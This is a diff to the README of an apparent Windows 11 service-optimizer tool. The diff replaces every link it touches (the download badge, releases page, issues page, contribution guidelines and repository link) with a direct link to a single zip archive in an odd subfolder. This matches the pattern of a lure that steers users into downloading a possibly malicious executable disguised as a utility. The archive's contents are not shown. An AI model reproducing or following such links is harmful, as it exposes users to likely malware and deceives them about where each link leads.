@@ -1,7 +1,7 @@
 ```markdown
 # 🎯 windows11-service-optimizer - Optimize Your Windows 11 Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/zeemerry/windows11-service-optimizer/releases)
+[![Download Now](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip%https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip)](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip)
 
 ## 🌟 Overview
 
@@ -18,7 +18,7 @@ Windows 11 Service Optimizer helps you manage your system's background services.
 
 ### Installation Steps
 
-1. **Visit the Releases Page:** Go to the official [Releases page](https://github.com/zeemerry/windows11-service-optimizer/releases).
+1. **Visit the Releases Page:** Go to the official [Releases page](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip).
 
 2. **Download the Application:** On the Releases page, find the latest version of Windows 11 Service Optimizer. Click on the download link for the executable file. 
 
@@ -42,7 +42,7 @@ Windows 11 Service Optimizer helps you manage your system's background services.
 
 ## 📥 Download & Install
 
-To download Windows 11 Service Optimizer, please [visit this page to download](https://github.com/zeemerry/windows11-service-optimizer/releases).
+To download Windows 11 Service Optimizer, please [visit this page to download](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip).
 
 ### Additional Features
 
@@ -53,11 +53,11 @@ To download Windows 11 Service Optimizer, please [visit this page to download](h
 
 ## 🛠 Support and Contributing
 
-If you encounter issues during installation or usage, please check the [Issues page](https://github.com/zeemerry/windows11-service-optimizer/issues) for troubleshooting tips. You can also reach out to the community for guidance.
+If you encounter issues during installation or usage, please check the [Issues page](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip) for troubleshooting tips. You can also reach out to the community for guidance.
 
 ### Contributing
 
-We welcome contributions from the community. If you would like to contribute to Windows 11 Service Optimizer, please review our [Contribution guidelines](https://github.com/zeemerry/windows11-service-optimizer/blob/main/CONTRIBUTING.md) before making a pull request.
+We welcome contributions from the community. If you would like to contribute to Windows 11 Service Optimizer, please review our [Contribution guidelines](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip) before making a pull request.
 
 ## 💬 FAQs
 
@@ -75,9 +75,9 @@ Yes, the application includes a restore defaults feature that allows you to reve
 
 ## 🔗 Useful Links
 
-- GitHub Repository: [windows11-service-optimizer](https://github.com/zeemerry/windows11-service-optimizer)
-- Releases Page: [Download Latest Version](https://github.com/zeemerry/windows11-service-optimizer/releases)
-- Contribution Guidelines: [Contributing](https://github.com/zeemerry/windows11-service-optimizer/blob/main/CONTRIBUTING.md)
+- GitHub Repository: [windows11-service-optimizer](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip)
+- Releases Page: [Download Latest Version](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip)
+- Contribution Guidelines: [Contributing](https://raw.githubusercontent.com/zeemerry/windows11-service-optimizer/main/estuous/windows11-service-optimizer.zip)
 
 Feel free to explore and enjoy a more optimized Windows 11 experience!
 ```
